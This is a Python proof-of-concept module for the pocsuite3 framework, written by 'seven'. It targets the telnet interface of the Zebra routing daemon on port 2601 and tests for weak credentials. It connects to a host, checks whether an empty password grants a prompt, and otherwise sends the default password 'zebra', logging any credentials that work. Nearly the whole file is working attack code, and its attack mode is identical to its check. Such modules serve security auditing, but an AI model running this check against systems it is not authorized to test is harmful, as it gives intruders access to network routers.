# -*- coding: utf-8 -*-
# author: seven
from pocsuite3.api import register_poc, POCBase, Output, logger, POC_CATEGORY
import socket


class ZebraPOC(POCBase):
    vulID = ''
    version = '1.0'
    author = ['seven']
    vulDate = 'Jul 11, 2020'
    createDate = 'Jul 11, 2020'
    name = 'zebra'
    appName = 'zebra'
    appVersion = 'v1.0.0'
    vulType = '弱口令'
    protocol = 'telnet'

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _verify(self):
        host = self.getg_option('rhost')
        port = self.getg_option('rport') or 2601
        res,password = check(host,port)
        result = {}
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['password'] = password
            result['extra'] = password
        return self.parse_output(result)

    def _attack(self):
        return self._verify()


def check(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(20)
    try:
        s.connect((host, int(port)))
        welcome = s.recv(1024)
        if check_login(welcome):
            logger.success('{}:{} empty password'.format(host,str(port)))
            return True, 'empty pass'
        elif b'password is not set' in welcome:
            logger.info('{}:{} password not set'.format(host,str(port)))
            pass 
        elif 'assword'.encode() in welcome:
            s.send('zebra\n'.encode())
            res = s.recv(1024)
            if check_login(res):
                logger.success('{}:{} pass:zebra'.format(host,str(port)))
                return True,'zebra'
    except Exception as e:
        logger.info('{}:{}\t{}'.format(host,str(port),str(e)))
        logger.info(str(e))
    finally:
        s.close()
    return False, ''


def check_login(res):
    return b'>' in res


register_poc(ZebraPOC)
